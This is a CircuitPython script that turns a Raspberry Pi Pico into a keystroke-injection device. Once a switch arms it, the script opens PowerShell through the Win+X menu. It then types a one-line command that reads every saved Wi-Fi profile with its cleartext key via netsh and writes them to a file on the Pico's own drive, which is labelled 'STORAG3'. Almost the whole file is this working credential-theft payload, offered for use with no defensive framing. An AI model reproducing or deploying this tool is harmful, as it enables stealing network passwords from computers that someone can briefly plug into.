import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Set up the switch pins
# this example assumes you are straddling the first GND pin
state1_pin = digitalio.DigitalInOut(board.GP1) # or whatever pin you chose
state1_pin.direction = digitalio.Direction.INPUT
state1_pin.pull = digitalio.Pull.UP

state2_pin = digitalio.DigitalInOut(board.GP2) # update if needed
state2_pin.direction = digitalio.Direction.INPUT
state2_pin.pull = digitalio.Pull.UP

# func to ship current line
def enter():
    kbd.press(Keycode.ENTER)
    time.sleep(0.1)
    kbd.release_all()

# configure our keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# only execute once "armed"
# this aims to minimze self-pwning
print("Waiting for switch to be in State 1 (GP1 to GND)...")
while True:
    s1 = state1_pin.value
    s2 = state2_pin.value
    
    if not s1 and s2:  # State 1: GP1 to GND
        print("State 1 detected! Executing script...")
        break
    
    time.sleep(0.1)


# Execute the HID script
time.sleep(2)  # Give host time to recognize Pico

# Open PowerShell via Win+X menu
kbd.press(Keycode.WINDOWS, Keycode.X)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.3)
kbd.press(Keycode.I)
time.sleep(0.1)
kbd.release_all()
time.sleep(1)

# Find Pico drive and extract WiFi credentials with null handling
# does not require admin
layout.write('$d=(gwmi win32_volume|?{$_.Label -eq "STORAG3"}).DriveLetter;"">"$d\\w.txt";$w=(netsh wlan show profiles)|sls ".*All User Profile.*: (.*)";$w.Matches|%{$n=$_.Groups[1].Value;$p=(netsh wlan show profiles name="$n" key=clear)|sls ".*Key Content.*:(.*)";if($p){$k=$p.Matches.Groups[1].Value}else{$k="N/A"};"$n : $k">>"$d\\w.txt"}')
enter()

print("Script completed!")
